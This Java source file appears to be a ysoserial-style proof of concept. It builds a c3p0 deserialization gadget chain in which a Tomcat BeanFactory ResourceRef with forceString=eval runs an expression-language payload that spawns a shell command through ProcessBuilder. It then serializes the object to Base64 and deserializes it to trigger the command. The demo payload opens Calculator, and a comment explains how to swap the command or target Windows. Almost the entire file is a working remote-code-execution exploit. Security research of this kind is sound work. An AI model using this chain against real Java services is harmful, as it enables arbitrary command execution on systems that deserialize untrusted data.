package ysoserial.vulndemo;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;

public class c3p0_no_network {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    private static class NotSerializable implements ConnectionPoolDataSource, Referenceable {

        private String classFactory;
        private String classFactoryLocation;

        public NotSerializable() {

            this.classFactory = "BeanFactory";
            this.classFactoryLocation = null;
        }

        public NotSerializable(String classFactory, String classFactoryLocation) {

            this.classFactory = classFactory;
            this.classFactoryLocation = classFactoryLocation;
        }

        @Override
        public Reference getReference() throws NamingException {

            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','\"open -a Calculator\"']).start()\")"));

            return ref;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public java.io.PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public void setLogWriter(java.io.PrintWriter out) throws SQLException {
        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {

        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        ConnectionPoolDataSource connectionPoolDataSource1 = new NotSerializable();
        Field field = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase, connectionPoolDataSource1);

        String serializeData = serialize(poolBackedDataSourceBase);
        System.out.println(serializeData);
        unserialize(serializeData);
    }
}
